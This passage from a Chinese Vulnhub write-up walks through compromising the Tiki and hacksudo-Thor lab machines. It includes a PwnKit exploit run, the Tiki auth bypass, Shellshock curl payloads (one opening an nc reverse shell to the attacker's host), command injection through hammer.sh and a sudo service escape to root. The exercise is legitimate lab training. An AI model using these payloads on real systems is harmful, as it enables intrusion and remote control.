<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unzip CVE-2021-4034-main.zip</span><br><span class="line">cd CVE-2021-4034</span><br><span class="line">make</span><br><span class="line">./cve-2021-4034</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115212915242.png" alt="image-20230115212915242"></p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230115212933097.png" alt="image-20230115212933097"></p>
<p>OK结束了</p>
<h2 id="Tiki"><a href="#Tiki" class="headerlink" title="Tiki"></a>Tiki</h2><p>前两个简单的做的有点不是很合适，Tiki看简介是OSCP靶机难度，试试</p>
<p>仍然是信息收集一套流程，netdiscover发现目标靶机ip：<code>192.168.1.12</code>，nmap嗅探相关信息和开放端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-16 18:14 HKT</span><br><span class="line">Nmap scan report for ubuntu (192.168.1.12)</span><br><span class="line">Host is up (0.00021s latency).</span><br><span class="line">Not shown: 996 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 a3:d8:4a:89:a9:25:6d:07:c5:3d:76:28:06:ed:d1:c0 (RSA)</span><br><span class="line">|   256 e7:b2:89:05:54:57:dc:02:f4:8c:3a:7c:55:8b:51:aa (ECDSA)</span><br><span class="line">|_  256 fd:77:07:2b:4a:16:3a:01:6b:e0:00:0c:0a:36:d8:2f (ED25519)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/tiki/</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.6.2</span><br><span class="line">MAC Address: 08:00:27:DB:FE:C3 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3.1.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2023-01-16T10:14:32</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.21 ms ubuntu (192.168.1.12)</span><br></pre></td></tr></table></figure>

<p>Ubuntu系统，开了22，80，139，445等等端口，开启了smb服务。80端口网页是apache默认页面</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116182106289.png" alt="image-20230116182106289"></p>
<p>dirsearch扫描后台，结果有一个很神奇，<code>/tiki/doc/stable.version</code>是怎么扫出来的，字典这也有？</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116182344866.png" alt="image-20230116182344866"></p>
<p><code>robots.txt</code>中配置结果如下</p>
<blockquote>
<p>User-Agent: *<br>Disallow:<br>Disallow: &#x2F;tiki&#x2F;</p>
</blockquote>
<p>OK，是个界面，Tiki wiki CMS，而<code>/tiki/doc/stable.version</code>里是一些数字</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116182638091.png" alt="image-20230116182638091"></p>
<blockquote>
<p>1.9.10.1<br>1.9.11<br>2.0<br>2.1<br>2.2<br>2.3<br>2.4<br>……<br>18.3<br>18.4<br>19.0<br>19.1<br>19.2<br>20.0<br>20.1</p>
</blockquote>
<p>直接搜索该CMS的漏洞，发现当对应版本&lt;21.2时候，存在Tiki Wiki CMS Groupware 认证绕过漏洞（CVE-2020-15906）&#x3D;&#x3D;我怀疑msf是不是砍掉了好多CVE，，，search莫得这个，最近的只有17年的cve&#x3D;&#x3D;</p>
<p>试了一下组合的CVE，不太彳亍嗷，这里就不放脚本了，然后我们根据github的链接一步步<a target="_blank" rel="noopener" href="https://github.com/S1lkys/CVE-2020-15906">复现</a>，其实很简单，就是多次爆破，然后回修改数据库中admin账号的密码，50次左右时候，将admin的密码删去提交表单即可成功以admin登录。</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116185621658.png" alt="image-20230116185621658"></p>
<p>进来后，找到一个文件上传的点，测试了一下，不行，，，，，先赶紧把admin的密码改了，修改为<code>ZW2000117ZW</code>作为后续使用</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116193759288.png" alt="image-20230116193759288"></p>
<p>继续收集信息，在wiki的list page中，有个用户silly的homepage和一个奇怪的页面</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116194624292.png" alt="image-20230116194624292"></p>
<p>U1S1，这作者蛮皮的<code>I got a new CVE Number: But I constantly forget its ID :/ </code></p>
<p>另一个叫<code>Credential</code>的页面有信息，这格式太像账号密码了，直接ssh连接试试</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116194808232.png" alt="image-20230116194808232"></p>
<p><code>ssh -p 22 silky@192.168.1.13</code>可以，直接连接上了woc</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116195059856.png" alt="image-20230116195059856"></p>
<p>列出账号信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false</span><br><span class="line">avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin</span><br><span class="line">saned:x:117:123::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin</span><br><span class="line">hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false</span><br><span class="line">whoopsie:x:120:125::/nonexistent:/bin/false</span><br><span class="line">colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span><br><span class="line">gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false</span><br><span class="line">gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false</span><br><span class="line">silky:x:1000:1000:Silky,,,:/home/silky:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">sshd:x:127:65534::/run/sshd:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>

<p>老方法查看SUID权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">/snap/snapd/17950/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core20/1778/usr/bin/chfn</span><br><span class="line">/snap/core20/1778/usr/bin/chsh</span><br><span class="line">/snap/core20/1778/usr/bin/gpasswd</span><br><span class="line">/snap/core20/1778/usr/bin/mount</span><br><span class="line">/snap/core20/1778/usr/bin/newgrp</span><br><span class="line">/snap/core20/1778/usr/bin/passwd</span><br><span class="line">/snap/core20/1778/usr/bin/su</span><br><span class="line">/snap/core20/1778/usr/bin/sudo</span><br><span class="line">/snap/core20/1778/usr/bin/umount</span><br><span class="line">/snap/core20/1778/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core20/1778/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core18/1880/bin/mount</span><br><span class="line">/snap/core18/1880/bin/ping</span><br><span class="line">/snap/core18/1880/bin/su</span><br><span class="line">/snap/core18/1880/bin/umount</span><br><span class="line">/snap/core18/1880/usr/bin/chfn</span><br><span class="line">/snap/core18/1880/usr/bin/chsh</span><br><span class="line">/snap/core18/1880/usr/bin/gpasswd</span><br><span class="line">/snap/core18/1880/usr/bin/newgrp</span><br><span class="line">/snap/core18/1880/usr/bin/passwd</span><br><span class="line">/snap/core18/1880/usr/bin/sudo</span><br><span class="line">/snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core18/1880/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core18/2667/bin/mount</span><br><span class="line">/snap/core18/2667/bin/ping</span><br><span class="line">/snap/core18/2667/bin/su</span><br><span class="line">/snap/core18/2667/bin/umount</span><br><span class="line">/snap/core18/2667/usr/bin/chfn</span><br><span class="line">/snap/core18/2667/usr/bin/chsh</span><br><span class="line">/snap/core18/2667/usr/bin/gpasswd</span><br><span class="line">/snap/core18/2667/usr/bin/newgrp</span><br><span class="line">/snap/core18/2667/usr/bin/passwd</span><br><span class="line">/snap/core18/2667/usr/bin/sudo</span><br><span class="line">/snap/core18/2667/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core18/2667/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/vmware-user-suid-wrapper</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/sbin/pppd</span><br></pre></td></tr></table></figure>

<p>草我人蒙了，，，我查看ubuntu的系统版本，sudo版本和libc版本，发现都和CVE-2021-3156对的上，，， 所以直接wget传了这个CVE包想着直接提权</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsb_release -a</span><br><span class="line">sudo --version</span><br><span class="line">ldd --version</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116203640051.png" alt="image-20230116203640051"></p>
<p><code>./sudo-hax-me-a-sandwich 1</code>结果出错！我很费解，，，</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116203809282.png" alt="image-20230116203809282"></p>
<p>妈的查了一下才发现，&#x3D;&#x3D;silky本身就和root权限一样高！&#x3D;&#x3D;（黑人问号脸.jpg）</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116210836049.png" alt="image-20230116210836049"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">youuser ALL=(ALL) ALL</span><br><span class="line">%youuser ALL=(ALL) ALL</span><br><span class="line">youuser ALL=(ALL) NOPASSWD: ALL</span><br><span class="line">%youuser ALL=(ALL) NOPASSWD: ALL</span><br><span class="line"></span><br><span class="line">第一行:允许用户youuser执行sudo命令(需要输入密码).</span><br><span class="line">第二行:允许用户组youuser里面的用户执行sudo命令(需要输入密码).</span><br><span class="line">第三行:允许用户youuser执行sudo命令,并且在执行的时候不输入密码.</span><br><span class="line">第四行:允许用户组youuser里面的用户执行sudo命令,并且在执行的时候不输入密码.</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116204132094.png" alt="image-20230116204132094"></p>
<h3 id="总结回顾"><a href="#总结回顾" class="headerlink" title="总结回顾"></a>总结回顾</h3><p>最后回顾了一下别人的做法，发现<strong>可以收集smb服务的消息</strong>，这是一个没考虑到的点，这里我还是正常从网站渗透。可以用<code>smbclient \\\\192.168.1.13\\Notes</code></p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116205545140.png" alt="image-20230116205545140"></p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230116210055656.png" alt="image-20230116210055656"></p>
<h2 id="hacksudo-Thor"><a href="#hacksudo-Thor" class="headerlink" title="hacksudo-Thor"></a>hacksudo-Thor</h2><p>老三样的信息收集</p>
<p><code>netdiscover</code>发现目标ip：192.168.1.7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-19 20:37 HKT</span><br><span class="line">Nmap scan report for hacksudothor (192.168.1.7)</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">21/tcp filtered ftp</span><br><span class="line">22/tcp open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 37:36:60:3e:26:ae:23:3f:e1:8b:5d:18:e7:a7:c7:ce (RSA)</span><br><span class="line">|   256 34:9a:57:60:7d:66:70:d5:b5:ff:47:96:e0:36:23:75 (ECDSA)</span><br><span class="line">|_  256 ae:7d:ee:fe:1d:bc:99:4d:54:45:3d:61:16:f8:6c:87 (ED25519)</span><br><span class="line">80/tcp open     http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">MAC Address: 08:00:27:CC:89:6B (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.26 ms hacksudothor (192.168.1.7)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds</span><br></pre></td></tr></table></figure>

<p>开了21，22，80这仨端口，估计重心还是在web上，进行访问80端口</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230119204335704.png" alt="image-20230119204335704"></p>
<p>后台扫描，信息还是蛮多的</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230119204547015.png" alt="image-20230119204547015"></p>
<p>以此访问，下载README.md，其他页面均为网页的静态页面，其中images有所有图片的下载，是一个图床</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230119205633370.png" alt="image-20230119205633370"></p>
<p><strong>tnnd，狗作者，晚上渗透呢妈的放个pennywise的图，服了</strong></p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230119205731057.png" alt="image-20230119205731057"></p>
<p>这图肯定有问题，md</p>
<p>&#x3D;&#x3D;binwalk，steghide，stegslove都测过了，这就是个图片，，，tmd突然好气啊&#x3D;&#x3D;</p>
<p>从下载的README收集信息，发现这个框架开源，直接在github上进行搜索</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230119233218178.png" alt="image-20230119233218178"></p>
<p>在其中<code>online-banking-system/net_banking.sql</code>中发现默认管理员账号密码</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230119233645836.png" alt="image-20230119233645836"></p>
<p>在<code>/admin_login.php</code>页面登录</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230119233752972.png" alt="image-20230119233752972"></p>
<p>管理后台检查了一遍，太干净了，没什么利用点感觉，一个上传新闻的位点，上传的也不能作为php代码执行</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230119234620021.png" alt="image-20230119234620021"></p>
<p>回过头查看信息，这里了解到一个古早版本的漏洞<code>CVE-2014-6271</code>，详情参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Gouwa/p/14282291.html">这篇文章</a></p>
<p>但是这里需要我首先确定一个存在的<code>/cgi-bin/xxx.xxx</code>的页面，fuzz一下</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230120000622586.png" alt="image-20230120000622586"></p>
<p>可以看到存在<code>/cgi-bin/shell.sh</code>，但是报500</p>
<p>按照<code>CVE-2014-6271</code><a target="_blank" rel="noopener" href="https://github.com/opsxcq/exploit-CVE-2014-6271">github地址</a>测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;cat /etc/passwd&#x27;&quot; \http://172.16.10.106/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230120000809114.png" alt="image-20230120000809114"></p>
<p>好家伙直接回显，那直接弹shell</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;nc 192.168.1.10 5555 -e /bin/bash&#x27;&quot; \http://192.168.1.7/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure>

<p><strong>直接回显！</strong></p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230120001255012.png" alt="image-20230120001255012"></p>
<p>接下来两步，<strong>一：查看当前用户可以无权限执行什么文件<code>sudo -l</code>。二：find查找suid权限<code>find / -perm -u=s -type f 2&gt;/dev/null</code></strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for www-data on HackSudoThor:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on HackSudoThor:</span><br><span class="line">    (thor) NOPASSWD: /home/thor/./hammer.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br></pre></td></tr></table></figure>

<p>上面列出了两种结果，我们切换thor用户执行hammer.sh</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u thor /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230120004114954.png" alt="image-20230120004114954"></p>
<p>从上述测试可以看出来，该程序第二个输入的参数message会被当作command执行，那我们直接输入**<code>/bin/bash</code>**得到Thor的shell</p>
<p><img src="/../images/Vulnhub%E8%AE%B0%E5%BD%95.assets/image-20230120004237105.png" alt="image-20230120004237105"></p>
<p>拿到对应的shell后，sudo -l发现还有可以无权限执行的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for thor on HackSudoThor:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User thor may run the following commands on HackSudoThor:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/cat, /usr/sbin/service</span><br></pre></td></tr></table></figure>

<p>从大佬文章中了解一个渗透提权超强的<a target="_blank" rel="noopener" href="https://gtfobins.github.io/#">网站</a>GTFObins，直接搜索对应的service，得到提权的方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/service ../../bin/sh</span><br></pre></td></tr></table></figure>

<p>但是需要根据本环境修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/sbin/service ../../bin/bash</span><br></pre></td></tr></table></figure>

